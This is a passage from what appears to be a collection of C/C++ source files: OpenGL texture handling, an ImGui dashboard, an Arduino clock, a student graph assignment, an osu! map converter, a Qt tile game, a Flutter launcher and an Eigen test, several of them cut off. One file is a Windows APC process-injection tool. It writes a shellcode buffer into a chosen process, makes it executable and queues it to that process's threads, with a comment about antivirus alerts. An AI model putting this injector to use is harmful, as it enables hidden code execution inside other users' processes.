} else if (numChannels == 3) {\n    format = GL_RGB;\n  } else if (numChannels == 4) {\n    format = GL_RGBA;\n  }\n  glTexImage2D(GL_TEXTURE_2D, 0, format, width, height, 0, format,\n               GL_UNSIGNED_BYTE, data);\n  glGenerateMipmap(GL_TEXTURE_2D);\n}\n\nvoid Texture::bind(const Shader &shader, unsigned int slot) const {\n  glActiveTexture(GL_TEXTURE0 + slot);\n  std::string name = \"u_Material.\";\n  if (_type == TextureType::DIFFUSE) {\n    name += \"diffuse\";\n  } else if (_type == TextureType::SPECULAR) {\n    name += \"specular\";\n  } else if (_type == TextureType::NORMAL) {\n    name += \"normal\";\n  }\n  shader.setInt(name, slot);\n  glBindTexture(GL_TEXTURE_2D, _id);\n}\n\nvoid Texture::unbind() const { glBindTexture(GL_TEXTURE_2D, 0); }\n",
    "\ufeff#pragma once\n\n#include \"MainDashboardWidget.h\"\n#include \"imgui.h\"\n#include \"gui.h\"\n#include \"packages/SettingsDataPackage.h\"\n\nnamespace tadaima\n{\n    namespace gui\n    {\n        namespace widget\n        {\n            void MainDashboardWidget::initialize(const tools::DataPackage& r_package)\n            {\n                const SettingsDataPackage* package = dynamic_cast<const SettingsDataPackage*>(&r_package);\n                if( package )\n                {\n                    m_username = package->get<std::string>(SettingsPackageKey::Username);\n                }\n            }\n\n            void MainDashboardWidget::draw(bool* p_open)\n            {\n                if( !ImGui::Begin(\"Main Dashboard\", p_open, ImGuiWindowFlags_NoDecoration) )\n                {\n                    ImGui::End();\n                    return;\n                }\n\n                // Header\n                ImGui::Text((const char*)std::format(\"Ohayou, {}!\", m_username).c_str());\n                ImGui::Text((const char*)u8\"I am so lucky to see you again here :-)\");\n                ImGui::Text((const char*)u8\"Let's learn some new words together!\");\n                ImGui::ProgressBar(0.65f, ImVec2(-1.0f, 0.0f), \"65% complete\");\n\n                // Word of the Day\n                ImGui::Separator();\n                ImGui::Text((const char*)u8\"Word of the Day: \\\"\u8336\\\" (\u3061\u3083) - Tea\");\n\n                // Performance Graphs\n                ImGui::Separator();\n                ImGui::Text(\"Performance Graphs:\");\n                ImGui::Text(\"Vocab Acquisition [\u2593\u2593\u2593\u2593\u2592\u2592\u2592] Pronunciation [\u2593\u2593\u2593\u2592\u2592\u2592\u2592]\");\n\n                // Cultural Insight\n                ImGui::Separator();\n                ImGui::Text(\"Cultural Insight: \\\"Golden Week\\\" - A week of holidays in Japan...\");\n\n                ImGui::End();\n            }\n        }\n    }\n}",
    "#include <Arduino.h>\n\n#include \"ClockManager.h\"\n#include \"settings.h\"\n\nvoid ClockManager::begin() {\n  _stepper.begin();\n}\n\nvoid ClockManager::start_ntp() {\n  configTime(0, 0, \"pool.ntp.org\");\n\n  struct tm timeinfo;\n  if (!getLocalTime(&timeinfo)) {\n    (*_logger)(\"Failed to obtain time\");\n    return;\n  }\n\n  time_source = SNTP;\n\n  log_current_time();\n  set_displayed_time_to_current();\n  _state = RUN;\n}\n\nvoid ClockManager::tick() {\n  if (_state == CALIBRATE_HOUR) {\n    (*_logger)(\"Calibrate hour\");\n\n    _calibrating = true;\n    _stepper.calibrate_hour(_calibrating);\n\n    (*_logger)(\"Calibration done\");\n\n    return;\n  }\n\n  if (_state == CALIBRATE_MINUTE) {\n    (*_logger)(\"Calibrate minute\");\n\n    _calibrating = true;\n    _stepper.calibrate_minute(_calibrating);\n\n    (*_logger)(\"Calibration done\");\n\n    return;\n  }\n\n  if (_state == DEMO) {\n    _stepper.step(true, false);\n    delay(500);\n    _stepper.step(true, true);\n    delay(500);\n    _stepper.step(false, true);\n\n    adjust_displayed_hour(2);\n    adjust_displayed_minute(2);\n\n    return;\n  }\n\n  if (_state == SET_MINUTES) {\n    set_minutes();\n    _state = RUN;\n\n    return;\n  }\n\n  sync_to_current_time();\n}\n\nvoid ClockManager::toggle_demo() {\n  _calibrating = false;\n  if (_state == DEMO) {\n    (*_logger)(\"End demo\");\n    _state = RUN;\n  } else {\n    (*_logger)(\"Start demo\");\n    _state = DEMO;\n  }\n}\n\nvoid ClockManager::set_displayed_time(int hour, int minute) {\n  _displayedHour = hour;\n  _displayedMinute = minute;\n\n  (*_logger)(\"Set displayed time to %02d:%02d\\n\", _displayedHour, _displayedMinute);\n}\n\nvoid ClockManager::set_displayed_time_to_current() {\n  struct tm timeinfo;\n  time_t now = time(0);\n  localtime_r(&now, &timeinfo);\n  int currentHour = timeinfo.tm_hour;\n  int currentMinute = timeinfo.tm_min;\n\n#if SIMULATE_12_HOUR == 1\n  if (currentHour == 0) {\n    currentHour = 12;\n  } else if (currentHour > 12) {\n    currentHour -= 12;\n  }\n#endif\n\n  set_displayed_time(currentHour, currentMinute);\n}\n\nvoid ClockManager::adjust_displayed_hour(int count) {\n  _displayedHour = _displayedHour + count;\n  if (_displayedHour < 0)\n    _displayedHour += 24;\n  else if (_displayedHour >= 24)\n    _displayedHour -= 24;\n}\n\nvoid ClockManager::adjust_displayed_minute(int count) {\n  _displayedMinute = _displayedMinute + count;\n  if (_displayedMinute < 0)\n    _displayedMinute += 60;\n  else if (_displayedMinute >= 60)\n    _displayedMinute -= 60;\n}\n\nvoid ClockManager::set_current_time(int hour, int minute, int second) {\n  struct tm timeinfo;\n  time_t now = time(0);\n  localtime_r(&now, &timeinfo);\n\n  timeinfo.tm_hour = hour;\n  timeinfo.tm_min = minute;\n  timeinfo.tm_sec = second;\n  timeinfo.tm_isdst = -1;\n\n  time_t t = mktime(&timeinfo);\n  struct timeval new_time = { .tv_sec = t };\n  settimeofday(&new_time, NULL);\n\n  log_current_time();\n}\n\nvoid ClockManager::set_current_date(int day, int month, int year) {\n  struct tm timeinfo;\n  time_t now = time(0);\n  localtime_r(&now, &timeinfo);\n\n  timeinfo.tm_mday = day;\n  timeinfo.tm_mon = month - 1;\n  timeinfo.tm_year = year - 1900;\n  timeinfo.tm_isdst = -1;\n\n  time_t t = mktime(&timeinfo);\n  struct timeval new_time = { .tv_sec = t };\n  settimeofday(&new_time, NULL);\n\n  log_current_time();\n}\n\nvoid ClockManager::log_current_time() {\n  struct tm timeinfo;\n  time_t now = time(0);\n  localtime_r(&now, &timeinfo);\n  char buffer[32];\n  strftime(buffer, 31, \"%Y-%m-%d %H:%M:%S %z\", &timeinfo);\n  (*_logger)(\"Current time is %s\", buffer);\n}\n\nvoid ClockManager::sync_to_current_time() {\n  struct tm timeinfo;\n  time_t now = time(0);\n  localtime_r(&now, &timeinfo);\n\n  int currentHour = timeinfo.tm_hour;\n  int currentMinute = timeinfo.tm_min;\n\n#if SIMULATE_12_HOUR == 1\n  if (currentHour == 0) {\n    currentHour = 12;\n  } else if (currentHour > 12) {\n    currentHour -= 12;\n  }\n#endif\n\n  if (currentHour == _displayedHour && currentMinute == _displayedMinute) {\n    return;\n  }\n\n  int offsetHour = currentHour - _displayedHour;\n  if (offsetHour < 0)\n    offsetHour += 24;\n  else if (offsetHour >= 24)\n    offsetHour -= 24;\n\n  int offsetMinute = currentMinute - _displayedMinute;\n  if (offsetMinute < 0)\n    offsetMinute += 60;\n  else if (offsetMinute >= 60)\n    offsetMinute -= 60;\n\n  if (offsetMinute > 50) {\n    offsetMinute = 0;\n  }\n\n  if(offsetHour == 23 && currentMinute >= 50) {\n    offsetHour = 0;\n  }\n\n  if(offsetHour == 0 && offsetMinute == 0) {\n    return;\n  }\n\n  (*_logger)(\"%02d:%02d -> %02d:%02d\", _displayedHour, _displayedMinute, currentHour, currentMinute);\n\n  while (offsetHour > 0 && offsetMinute > 0) {\n    (*_logger)(\"  Advance hour and minute\");\n    offsetHour--;\n    adjust_displayed_hour(1);\n    offsetMinute--;\n    adjust_displayed_minute(1);\n\n    _stepper.step(true, true);\n  }\n\n  while (offsetHour > 0) {\n    (*_logger)(\"  Advance hour\");\n    offsetHour--;\n    adjust_displayed_hour(1);\n\n    _stepper.step(true, false);\n  }\n\n  while (offsetMinute > 0) {\n    (*_logger)(\"  Advance minute\");\n    offsetMinute--;\n    adjust_displayed_minute(1);\n\n    _stepper.step(fal",
    "#include <iostream>\n#include <string>\n#include <vector>\n#include <sstream>\n#include <fstream>\n#include <algorithm>\n#include \"Graph.h\"\n\n \nbool comp(account& comp1, account& comp2){\n    return comp1.getName() < comp2.getName();\n}\n\n\n// this is the resource i used for transform https://stackoverflow.com/questions/313970/how-to-convert-an-instance-of-stdstring-to-lower-case\nstring makeLower(const string& letter) {\n    string result = letter;\n    transform(result.begin(), result.end(), result.begin(),\n                   [](unsigned char k) { return tolower(k); });\n    return result;\n}\n\n///////////////// Before submitting your code\n //uncomment this part since zyBooks use it.\n int main(int argc, const char* argv[]) {\n    if (argc != 2)\n     {\n         std::cout << \"./project4 inputFile\" << std::endl;\n         return EXIT_FAILURE;\n     }\n    string inputFileName = argv[1];\n    \n///////////////////// uncomment above befofre submitting on zyBooks /////////////////\n//2) Comment the next 2 lines below\n// int main(void) {\n//     string inputFileName = \"input1.txt\";    //Do NOT change the name \"inputFileName\" since used above\n\nvector<account> total;\n/// everything under this is from homework 8 \n\n    ifstream inputFile(inputFileName);\n    if (inputFile.fail()) {\n        cout << \"Failed to open file\" << endl;\n        return 1 ;\n    }\n    \n    string node, neinode;\n    while (inputFile >> node >> neinode) {\n        // call the make lower function to make everything lower case \n        node = makeLower(node);\n    neinode = makeLower(neinode);\n    // 2 bool statements that start at false and we make it true when neeeded\n        bool foundNode = false, foundNeinode = false;\n\n        // Check if the node and neinode already exist in the 'total' vector\n    for (auto it = total.begin(); it != total.end(); ++it) {\n    if (it->getName() == node) {\n        it->setFollower(neinode);\n        foundNode = true;\n    } else if (it->getName() == neinode) {\n        it->setFollowing(node);\n        foundNeinode = true;\n    }\n\n    // If both node and neinode found, stop searching\n    if (foundNode && foundNeinode)\n        break;\n\n           \n       }\n        // If node or neinode not found, create new account and add to 'total'\n    if (foundNode == false || foundNeinode == false) {\n    if (foundNode == false) {\n        account newNode(node);\n        newNode.setFollower(neinode);\n        total.push_back(newNode);\n    }\n    if (foundNeinode == false) {\n        account newNeinode(neinode);\n        newNeinode.setFollowing(node);\n        total.push_back(newNeinode);\n    }\n}\n}\n    inputFile.close();\n    // homework 8 code ends\n    //set all degrees\n    \nfor (unsigned int i = 0; i < total.size(); ++i) {\n    total[i].setdeg();\n}\n\n\n//sort the vectors for total of type account\n\nstable_sort(total.begin(),total.end());\n\n\n\n//gets the last of the vector\naccount high = total.back();\n\n\nvector<account>onedeg;\n// i made rfollow = to high.getfollower() because i kept getting errors when using high.getFollower().size() in the for loop\nvector<string>rfollow = high.getFollower();\n\n\n\n\nsort(rfollow.begin(), rfollow.end(), [](const string& a, const std::string& b) {\n    return a < b; \n});\n\n\n///nested for loops that add total to onedeg and finishes after it goes through all total.size()\n\nfor (unsigned int i = 0; i < total.size(); ++i) {\n    for (unsigned int j = 0; j < rfollow.size(); ++j) {\n        if (total[i].getName() == rfollow[j]) {\n            onedeg.push_back(total[i]);\n            break;\n        }\n    }\n}\n\n// sort in alphabetlical order for the degrees\n\nsort(onedeg.begin(), onedeg.end(), [](const account& a, const account& b) {\n    return a.getName() < b.getName();\n});\ncout << \"The root user is \" << high.getName() << \", with in-degree centrality of \" << high.getdeg() << \".\" << endl;\n\n\n  \n  cout << \"There are \" << total.size() << \" users in the social network\" << \".\" << endl;\n  \n  \n  \n  cout << high.getName() << \" (0)\" << endl;\n  \n  // for loop to print the degrees\n  \n  for (unsigned int  i = 0; i < onedeg.size(); ++i) {\n      \n      \n      \n    const account& onefollow = onedeg[i];\n    \n    \n     vector<string>simplefollower = onefollow.getFollower();\n\n//frist degree\n\n    cout << onefollow.getName() << \" (1)\" << endl;\n\n\n\n// sorting second degree\n    sort(simplefollower.begin(), simplefollower.end());\n\n    //second degree\n    \n    for (unsigned int j = 0; j < simplefollower.size(); ++j) {\n        cout << simplefollower.at(j) << \" (2)\" << endl;\n    }\n}\n\n   return 0;   \n}\n",
    "#include <iostream>\r\n#include <filesystem>\r\n#include <vector>\r\n#include <fstream>\r\n#include <sstream>\r\n#include <string.h>\r\n#include <string_view>\r\n#include <algorithm>\r\n\r\nvoid downgradeOsuFile(std::filesystem::path filePath, bool keepOD);\r\n\r\nstd::string removeCarriageReturn(std::string str)\r\n{\r\n  str.erase(std::remove(str.begin(), str.end(), '\\r'), str.end());\r\n  return str;\r\n}\r\nbool is_number(const std::string &s)\r\n{\r\n  std::string::const_iterator it = s.begin();\r\n  while (it != s.end() && std::isdigit(*it))\r\n    ++it;\r\n  return !s.empty() && it == s.end();\r\n}\r\nstd::string replaceString(std::string subject, const std::string &search, const std::string &replace)\r\n{\r\n  size_t pos = subject.find(search);\r\n  while (pos != std::string::npos)\r\n  {\r\n    subject.replace(pos, search.length(), replace);\r\n    pos = subject.find(search, pos + replace.length());\r\n  }\r\n  return subject;\r\n}\r\nbool string_contains(std::string input, std::string key)\r\n{\r\n  if (input.find(key) != std::string::npos)\r\n  {\r\n    return true;\r\n  }\r\n  return false;\r\n}\r\nstd::vector<std::string> split(std::string s, std::string delimiter)\r\n{\r\n  size_t pos_start = 0, pos_end, delim_len = delimiter.length();\r\n  std::string token;\r\n  std::vector<std::string> res;\r\n\r\n  while ((pos_end = s.find(delimiter, pos_start)) != std::string::npos)\r\n  {\r\n    token = s.substr(pos_start, pos_end - pos_start);\r\n    pos_start = pos_end + delim_len;\r\n    res.push_back(token);\r\n  }\r\n\r\n  res.push_back(s.substr(pos_start));\r\n  return res;\r\n}\r\nstd::vector<std::string> split_first(std::string s, std::string delimiter)\r\n{\r\n  size_t pos_start = 0, pos_end, delim_len = delimiter.length();\r\n  std::string token;\r\n  std::vector<std::string> res;\r\n\r\n  if ((pos_end = s.find(delimiter, pos_start)) != std::string::npos)\r\n  {\r\n    token = s.substr(pos_start, pos_end - pos_start);\r\n    res.push_back(token);\r\n    pos_start = pos_end + delim_len;\r\n  }\r\n\r\n  res.push_back(s.substr(pos_start));\r\n  return res;\r\n}\r\n\r\nint main()\r\n{\r\n  int option_range = 0;\r\n  std::cout << \"##################\\nosuTo2007 v1.6\\nosu! : _Railgun_\\nDiscord : @railgun_osu\\n##################\\n\\n\";\r\n  std::vector<std::filesystem::path> map_list;\r\n  for (const auto &entry : std::filesystem::directory_iterator(std::filesystem::current_path()))\r\n  {\r\n    if (entry.path().extension() == \".osu\")\r\n    {\r\n      map_list.push_back(entry.path());\r\n    }\r\n  }\r\n  if (map_list.size() == 0)\r\n  {\r\n    std::cout << \"No .osu files found\\nExiting...\";\r\n    return 0;\r\n  }\r\n  else\r\n  {\r\n    std::cout << \"Choose which .osu file you want to convert to v3:\\n\\n\";\r\n    if (map_list.size() > 1)\r\n    {\r\n      std::cout << \"0 = All listed below\\n\";\r\n    }\r\n    for (size_t i = 1; i - 1 < map_list.size(); i++)\r\n    {\r\n      std::cout << i << \" = \" << map_list[i - 1].filename() << \"\\n\";\r\n      option_range++;\r\n    }\r\n  }\r\nopt:\r\n  std::cout << \"Choose an option:\\n\";\r\n  std::string input;\r\n  std::cin >> input;\r\n  if (!is_number(input))\r\n  {\r\n    std::cout << \"Not a number\\n\";\r\n    goto opt;\r\n  }\r\n  if (!(std::stoi(input) < option_range + 1))\r\n  {\r\n    std::cout << \"Invalid Option\\n\";\r\n    goto opt;\r\n  }\r\n  bool keep_OD;\r\nopt2:\r\n  std::cout << \"Because in v3 AR(ApproachRate) is tied to OD(OverallDifficulty):\\nOD = AR\\nDo you prefer to have:\\n1 = same OverallDifficulty (map might be hard to read)\\n2 = same ApproachRate (map might be hard to acc)\\n\";\r\n  std::string input2;\r\n  std::cin >> input2;\r\n  if (!is_number(input2))\r\n  {\r\n    std::cout << \"Not a number\\n\";\r\n    goto opt2;\r\n  }\r\n  if ((std::stoi(input2) < 1) || (std::stoi(input2) > 2))\r\n  {\r\n    std::cout << \"Invalid Option\\n\";\r\n    goto opt2;\r\n  }\r\n  if (input2 == \"1\")\r\n  {\r\n    keep_OD = true;\r\n  }\r\n  else\r\n  {\r\n    keep_OD = false;\r\n  }\r\n  if (std::stoi(input) == 0)\r\n  {\r\n    for (int i = 0; i < map_list.size(); i++)\r\n    {\r\n      downgradeOsuFile(map_list[i], keep_OD);\r\n    }\r\n  }\r\n  else\r\n  {\r\n    downgradeOsuFile(map_list[std::stoi(input) - 1], keep_OD);\r\n  }\r\n  return 0;\r\n}\r\n\r\nvoid downgradeOsuFile(std::filesystem::path filePath, bool keepOD)\r\n{\r\n  // predefined keys to search for\r\n  static std::vector<std::string> general_Var = {\"AudioFilename\", \"PreviewTime\", \"SampleSet\"};\r\n  static std::vector<std::string> metaData_Var = {\"Title\", \"Artis\", \"Creator\", \"Version\"};\r\n  static std::vector<std::string> difficulty_Var = {\"HPDrainRate\", \"CircleSize\", \"OverallDifficulty\", \"ApproachRate\", \"SliderMultiplier\", \"SliderTickRate\"};\r\n\r\n  // current filename\r\n  std::string fileName = \"(converted) \" + filePath.filename().string();\r\n\r\n  // osu file format version\r\n  std::string fileFormat = \"\";\r\n  std::string OD_line = \"\";\r\n  std::string AR_line = \"\";\r\n  std::vector<std::pair<std::string, std::string>> general, metadata, difficulty;\r\n  std::vector<std::string> events, timingPoints, hitObjects;\r\n  bool skip = false;\r\n  int section = 0;\r\n  std::cout << \"Downgrading \" << filePath.filename() << \" to v3 file format...\\n\";\r\n  std::ifstream file(filePath);\r\n  if (file.is_open())\r\n  {\r\n    std::string line;\r\n\r\n  ",
    "#include <QtWidgets>\r\n#include <QKeyEvent>\r\n#include <QMessageBox>\r\n#include <QFile>\r\n#include <QTextStream>\r\n#include <QTimer>\r\n#include \"class.h\"\r\n#include \"gameui.h\"\r\n\r\nGameUi::GameUi(QWidget *parent)\r\n    : QWidget{parent}\r\n{\r\n    // Open file\r\n    file.setFileName(\"progress.txt\");\r\n    if (file.open(QIODevice::WriteOnly | QIODevice::Text)) {\r\n        stream.setDevice(&file);\r\n    }\r\n    else {\r\n        qDebug() << \"Failed to open file:\" << file.errorString();\r\n    }\r\n\r\n    // GUI initialization\r\n    // Main layout\r\n    QHBoxLayout *mainLayout = new QHBoxLayout(this);\r\n\r\n    QGridLayout *boardLayout = new QGridLayout();\r\n    boardLayout->setSpacing(10);\r\n\r\n    // Add block labels to the grid layout\r\n    for (int i = 0; i < 4; i++) {\r\n        for (int j = 0; j < 4; j++) {\r\n            myBlock[i][j] = new BlockUi(this);\r\n            boardLayout->addWidget(myBlock[i][j], i, j);\r\n        }\r\n    }\r\n    mainLayout->addLayout(boardLayout);\r\n\r\n    QVBoxLayout *RightLayout = new QVBoxLayout();\r\n    RightLayout->setSpacing(10);\r\n\r\n    // Score display label\r\n    scoreLabel = new QLabel(this);\r\n    scoreLabel->setStyleSheet(\"QLabel { color: black; }\");\r\n    scoreLabel->setText(\"Score: 0 \");\r\n    scoreLabel->setAlignment(Qt::AlignCenter);\r\n    RightLayout->addWidget(scoreLabel, 0, Qt::AlignTop);\r\n\r\n    QFont font1 = scoreLabel->font();\r\n    font1.setPointSize(30);\r\n    scoreLabel->setFont(font1);\r\n\r\n    // Restore button\r\n    restoreButton = new QPushButton(\"Restore\", this);\r\n    restoreButton->setFixedSize(300, 200);\r\n    RightLayout->addWidget(restoreButton, 3);\r\n\r\n    QFont font3 = restoreButton->font();\r\n    font3.setPointSize(20);\r\n    restoreButton->setFont(font3);\r\n\r\n    connect(restoreButton, &QPushButton::clicked, this, &GameUi::PressRestore);\r\n\r\n    // Exit button\r\n    exitButton = new QPushButton(\"Exit\", this);\r\n    exitButton->setFixedSize(300, 200);\r\n    RightLayout->addWidget(exitButton, 2);\r\n\r\n    QFont font2 = exitButton->font();\r\n    font2.setPointSize(20);\r\n    exitButton->setFont(font2);\r\n\r\n    connect(exitButton, &QPushButton::clicked, this, &GameUi::PressQuit); // exit\r\n\r\n    // Change focus policy\r\n    restoreButton->setFocusPolicy(Qt::NoFocus);\r\n    exitButton->setFocusPolicy(Qt::NoFocus);\r\n\r\n    mainLayout->addLayout(RightLayout);\r\n\r\n    // Member initialization\r\n    myGame = new Game(stream);\r\n    stream.flush();\r\n    UpdateUI();\r\n}\r\n\r\nvoid GameUi::PressQuit(){\r\n    // Display quit confirmation dialog\r\n    QMessageBox msgBox;\r\n    msgBox.setIcon(QMessageBox::Question);\r\n    msgBox.setWindowTitle(\"Exit\");\r\n    msgBox.setText(\"Are you sure you want to quit?\");\r\n    msgBox.setStandardButtons(QMessageBox::Yes | QMessageBox::No);\r\n    if(msgBox.exec()==QMessageBox::Yes){\r\n        QApplication::quit();\r\n    }\r\n    return;\r\n}\r\n\r\nvoid GameUi::PressRestore()\r\n{\r\n    if(myGame->restoreCount==0){\r\n        // Display message when restore count is 0\r\n        QMessageBox msgBox;\r\n        msgBox.setIcon(QMessageBox::Information);\r\n        msgBox.setWindowTitle(\"Restore\");\r\n        msgBox.setText(\"No more chances to restore the board to its previous state.\");\r\n        msgBox.setStandardButtons(QMessageBox::Yes);\r\n        msgBox.exec();\r\n        return;\r\n    }\r\n\r\n    // Display restore confirmation dialog\r\n    QMessageBox msgBox;\r\n    msgBox.setIcon(QMessageBox::Question);\r\n    msgBox.setWindowTitle(\"Restore\");\r\n    msgBox.setText(\"Restore the game board to its previous state?\");\r\n    msgBox.setInformativeText(\"Remaining chances: \" + QString::number(myGame->restoreCount));\r\n    msgBox.setStandardButtons(QMessageBox::Yes | QMessageBox::No);\r\n    msgBox.setDefaultButton(QMessageBox::Yes);\r\n    int result = msgBox.exec();\r\n\r\n    if (result == QMessageBox::Yes) {\r\n        if(myGame->hasBuff==1){\r\n            for(int i=0; i<4; i++){\r\n                for(int j=0; j<4; j++){\r\n                    myGame->gameBoard->blocks[i][j]->value=myGame->preBoard->blocks[i][j]->value;\r\n                }\r\n            }\r\n            myGame->score=myGame->preScore;\r\n            myGame->hasBuff=0;\r\n            myGame->restoreCount--;\r\n            UpdateUI();\r\n            QMessageBox msgBox2;\r\n            msgBox2.setIcon(QMessageBox::Information);\r\n            msgBox2.setWindowTitle(\"Restore\");\r\n            msgBox2.setText(\"The board has been restored to its previous state!\");\r\n            msgBox2.setStandardButtons(QMessageBox::Ok);\r\n            msgBox2.exec();\r\n            stream << \"RESTORE \" << myGame->restoreCount << '\\n';\r\n            stream.flush();\r\n        }\r\n        else{\r\n            QMessageBox msgBox2;\r\n            msgBox2.setIcon(QMessageBox::Information);\r\n            msgBox2.setWindowTitle(\"Restore\");\r\n            msgBox2.setText(\"There is no previously saved board in the buffer.\");\r\n            msgBox2.setStandardButtons(QMessageBox::Ok);\r\n            msgBox2.exec();\r\n        }\r\n    } else {\r\n        // Do nothing if \"No\" is selected\r\n    }\r\n}\r\n\r\nvoid GameUi::keyPressEvent(QKeyEvent *event)\r\n{\r\n    if(myGame->resto",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"app_yesno_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <windows.h>\n#include <psapi.h>\n#include <tlhelp32.h>\n\nvoid RunAPC(LPVOID pVirtualMem, int iProcID);\n\nint main()\n{\n\tDWORD dwProcList[1024];\n\tDWORD dwBytesWritten;\n\tDWORD dwOldProtect = 0;\n\tHANDLE hProc;\n\tSIZE_T bytesWritten;\n\tint PID, counter = 0;\n\tchar cProcName[100];\n\tunsigned char shellcode[] = \"\";\n\n\tprintf(\"Type PID: \");\n\tscanf_s(\"%d\", &PID);\n    EnumProcesses(dwProcList, sizeof(dwProcList), &dwBytesWritten);\n\n    while(counter < (dwBytesWritten / 4)) {\n\t\thProc = OpenProcess(PROCESS_ALL_ACCESS, 0, dwProcList[counter]);\n        if (GetModuleBaseNameA(hProc, NULL, cProcName, 100)) {\n\t\t\tif (dwProcList[counter] == PID) {\n\t\t\t\tprintf(\"PROCCESS NAME - %s\\n\", cProcName);\n\t\t\t\tLPVOID pVirtualMem = VirtualAllocEx(hProc, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);\n\t\t\t\tWriteProcessMemory(hProc, pVirtualMem, shellcode, (SIZE_T)sizeof(shellcode), &bytesWritten);\n\t\t\t\tVirtualProtectEx(hProc, pVirtualMem,(SIZE_T)sizeof(shellcode), PAGE_EXECUTE_READ, &dwOldProtect);\n\t\t\t\tRunAPC(pVirtualMem,dwProcList[counter]);\n\t\t\t}\n            CloseHandle(hProc);\n        }\n\t\tcounter++;\n    }\n}\n\nvoid RunAPC(LPVOID pVirtualMem, int iProcId) {\n\tTHREADENTRY32 thEntry;  thEntry.dwSize = sizeof(THREADENTRY32);\n\tHANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0); // alert -> AV\n\n\tif (hSnapshot == INVALID_HANDLE_VALUE) {\n\t\tprintf(\"Error Openning the function\");\n\t\tCloseHandle(hSnapshot);\n\t}\n\n\tfor (Thread32First(hSnapshot, &thEntry); Thread32Next(hSnapshot, &thEntry);) {\n\t\tif (thEntry.th32OwnerProcessID == iProcId) {\n\t\t\tHANDLE target_thread_handle = OpenThread(THREAD_ALL_ACCESS, NULL, thEntry.th32ThreadID);\n\t\t\tprintf(\"PROC [%d] ThreadID: %d\\n\", thEntry.th32OwnerProcessID, thEntry.th32ThreadID);\n\t\t\tQueueUserAPC((PAPCFUNC)pVirtualMem, target_thread_handle, NULL);\n\t\t}\n\t}\n\tCloseHandle(hSnapshot);\n}\n",
    "// This file is part of Eigen, a lightweight C++ template library\n// for linear algebra.\n//\n// Copyright (C) 2009-2014 Gael Guennebaud <gael.guennebaud@inria.fr>\n//\n// This Source Code Form is subject to the terms of the Mozilla\n// Public License v. 2.0. If a copy of the MPL was not distributed\n// with this file, You can obtain one at http://mozilla.org/MPL/2.0/.\n\n#include \"main.h\"\n\ntemplate <typename T>\nEIGEN_DONT_INLINE T copy(const T& x) {\n  return x;\n}\n\ntemplate <typename MatrixType>\nvoid stable_norm(const MatrixType& m) {\n  /* this test covers the following files:\n     StableNorm.h\n  */\n  using std::abs;\n  using std::sqrt;\n  typedef typename MatrixType::Scalar Scalar;\n  typedef typename NumTraits<Scalar>::Real RealScalar;\n\n  bool complex_real_product_ok = true;\n\n  // Check the basic machine-dependent constants.\n  {\n    int ibeta, it, iemin, iemax;\n\n    ibeta = std::numeric_limits<RealScalar>::radix;         // base for floating-point numbers\n    it = std::numeric_limits<RealScalar>::digits;           // number of base-beta digits in mantissa\n    iemin = std::numeric_limits<RealScalar>::min_exponent;  // minimum exponent\n    iemax = std::numeric_limits<RealScalar>::max_exponent;  // maximum exponent\n\n    VERIFY((!(iemin > 1 - 2 * it || 1 + it > iemax || (it == 2 && ibeta < 5) || (it <= 4 && ibeta <= 3) || it < 2)) &&\n           \"the stable norm algorithm cannot be guaranteed on this computer\");\n\n    Scalar inf = std::numeric_limits<RealScalar>::infinity();\n    if (NumTraits<Scalar>::IsComplex && (numext::isnan)(inf * RealScalar(1))) {\n      complex_real_product_ok = false;\n      static bool first = true;\n      if (first)\n        std::cerr << \"WARNING: compiler mess up complex*real product, \" << inf << \" * \" << 1.0 << \" = \"\n                  << inf * RealScalar(1) << std::endl;\n      first = false;\n    }\n  }\n\n  Index rows = m.rows();\n  Index cols = m.cols();\n\n  // get a non-zero random factor\n  Scalar factor = internal::random<Scalar>();\n  while (numext::abs2(factor) < RealScalar(1e-4)) factor = internal::random<Scalar>();\n  Scalar big = factor * ((std::numeric_limits<RealScalar>::max)() * RealScalar(1e-4));\n\n  factor = internal::random<Scalar>();\n  while (numext::abs2(factor) < RealScalar(1e-4)) factor = internal::random<Scalar>();\n  Scalar small = factor * ((std::numeric_limits<RealScalar>::min)() * RealScalar(1e4));\n\n  Scalar one(1);\n\n  MatrixType vzero = MatrixType::Zero(rows, cols), vrand = MatrixType::Random(rows, cols), vbig(rows, cols),\n             vsmall(rows, cols);\n\n  vbig.fill(big);\n  vsmall.fill(small);\n\n  VERIFY_IS_MUCH_SMALLER_THAN(vzero.norm(), static_cast<RealScalar>(1));\n  VERIFY_IS_APPROX(vrand.stableNorm(), vrand.norm());\n  VERIFY_IS_APPROX(vrand.blueNorm(), vrand.norm());\n  VERIFY_IS_APPROX(vrand.hypotNorm(), vrand.norm());\n\n  // test with expressions as input\n  VERIFY_IS_APPROX((one * vrand).stableNorm(), vrand.norm());\n  VERIFY_IS_APPROX((one * vrand).blueNorm(), vrand.norm());\n  VERIFY_IS_APPROX((one * vrand).hypotNorm(), vrand.norm());\n  VERIFY_IS_APPROX((one * vrand + one * vrand - one * vrand).stableNorm(), vrand.norm());\n  VERIFY_IS_APPROX((one * vrand + one * vrand - one * vrand).blueNorm(), vrand.norm());\n  